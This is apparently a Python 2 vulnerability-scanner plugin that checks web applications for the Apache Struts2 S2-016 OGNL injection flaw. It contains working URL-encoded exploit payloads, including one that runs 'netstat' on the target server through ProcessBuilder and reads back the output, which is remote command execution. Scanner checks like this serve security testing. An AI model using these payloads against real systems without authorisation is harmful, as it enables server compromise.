#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_url(http,ob,item):
    print "--==--==-==--==-===----"
    print ob['isstart']
    print "--==--==-==--==-===----"
    detail=""
    list=[]
    try:
        url=item['url'].lower()
       
        if url.find(".action")<0 and url.find(".do")<0:
            return []

        exp="?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println(\'NVS_STRUTS2_TEST\'),%23w.flush(),%23w.close()}"
       
        exp2="?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{\'netstat\'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        
        expurl="%s%s"%(item['url'],exp)
#        print expurl
        print "==============="
        #response, content = http.request(expurl)
        response, content = yx_httplib2_request(http,expurl)
#        print content
        if content.find("NVS_STRUTS2_TEST")>=0 and response['status']=='200' and content.find("<html>")<0 and content.find("<html")<0 and content.find("println('NVS_STRUTS2_TEST')")<0:
            request = getRequest(expurl)
            response = getResponse(response)
            if ob['isstart']=='1':
                detail=audit(item['url'],http)
                
            list.append(getRecord(ob,item['url'],ob['level'],detail,request,response))
        else:
            
            expurl2="%s%s"%(item['url'],exp2)
#            print "xxxx"
#            print expurl2 
            #response,content=http.request(expurl2)
            response,content=yx_httplib2_request(http,expurl2)
            
            if (content.find("ESTABLISHED")>=0 or content.find("TIME_WAIT")>=0 or content.find("LISTENING")>=0 or content.find("LISTEN")>=0)and content.lower().find("</html>")<0 and response['status']=='200':
                print response
                request = getRequest(expurl2)
                response = getResponse(response)
                if ob['isstart']=='1':
                    detail=audit(item['url'],http)
                list.append(getRecord(ob,item['url'],ob['level'],detail,request,response))
                
    except Exception,e:
        logging.getLogger().error("File:structs2_s2_016script.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:structs2_s2_016script.py, run_url function :" + str(e))
    #end try
    
    return list
def audit(url,http):
    try:
        
    
        structsexp="?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{\'netstat\'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        structsexpurl="%s%s"%(url,structsexp)
        #response,content=http.request(structsexpurl)
        response,content=yx_httplib2_request(http,structsexpurl)
        if content.find("ESTABLISHED")>=0 and response['status']=='200':
            return "验证性扫描结果：\n%s\n"%content
    except Exception,e:
        logging.getLogger().error("structs-s2-016script.audit")
        return ""
    
